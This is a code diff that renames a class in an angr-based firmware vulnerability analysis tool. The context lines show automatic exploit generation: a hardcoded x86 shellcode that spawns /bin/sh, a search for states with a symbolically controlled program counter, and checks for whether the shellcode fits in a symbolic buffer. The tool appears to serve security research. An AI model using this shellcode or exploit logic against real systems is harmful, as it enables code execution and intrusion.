@@ -13,7 +13,7 @@ from angr import sim_options as so
 import os
 
 
-class FwVulerAnalyze:
+class FwVulnerAnalyze:
 
     shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
     def __init__(self, file_id):
@@ -80,7 +80,7 @@ class FwVulerAnalyze:
             sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))
 
         for addr in sym_addrs:
-            if FwVulerAnalyze.check_continuity(addr, sym_addrs, length):
+            if FwVulnerAnalyze.check_continuity(addr, sym_addrs, length):
                 yield addr
 
     def vuler_analyze(self):
@@ -107,7 +107,7 @@ class FwVulerAnalyze:
             if len(sm.unconstrained) > 0:
                 # l.info("found some unconstrained states, checking exploitability")
                 for u in sm.unconstrained:
-                    if FwVulerAnalyze.fully_symbolic(u, u.regs.pc):
+                    if FwVulnerAnalyze.fully_symbolic(u, u.regs.pc):
                         exploitable_state = u
                         break
 
@@ -122,10 +122,10 @@ class FwVulerAnalyze:
         # l.info("attempting to create exploit based off state")
 
         # keep checking if buffers can hold our shellcode
-        for buf_addr in FwVulerAnalyze.find_symbolic_buffer(ep, len(FwVulerAnalyze.shellcode)):
+        for buf_addr in FwVulnerAnalyze.find_symbolic_buffer(ep, len(FwVulnerAnalyze.shellcode)):
             # l.info("found symbolic buffer at %#x", buf_addr)
-            memory = ep.memory.load(buf_addr, len(FwVulerAnalyze.shellcode))
-            sc_bvv = ep.solver.BVV(FwVulerAnalyze.shellcode)
+            memory = ep.memory.load(buf_addr, len(FwVulnerAnalyze.shellcode))
+            sc_bvv = ep.solver.BVV(FwVulnerAnalyze.shellcode)
 
             # check satisfiability of placing shellcode into the address
             if ep.satisfiable(extra_constraints=(memory == sc_bvv, ep.regs.pc == buf_addr)):
